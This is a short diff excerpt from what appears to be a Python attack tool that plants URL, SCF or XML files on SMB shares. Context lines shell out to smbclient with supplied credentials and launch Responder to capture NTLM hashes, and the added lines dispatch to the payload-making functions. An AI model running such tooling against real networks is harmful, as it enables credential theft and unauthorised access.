@@ -76,4 +76,11 @@ def xml(ip):
 	os.system("""smbclient \\\\\\\\"""+rhost+"""\\\\"""+share+""" -U """+domain+"""/"""+username+"""%"""+password+"""""")
 	os.system("""sudo responder -I """+interface+""" -wv""")  
 
+if args.url == True:
+	url(ip)
+if args.scf == True:
+	scf(ip)
+if args.xml == True:
+	xml(ip)
+
 #Thank you dze64 for all the help while making this, he made it much better but I wanted / needed to learn some python, had a lot of fun making this and learning
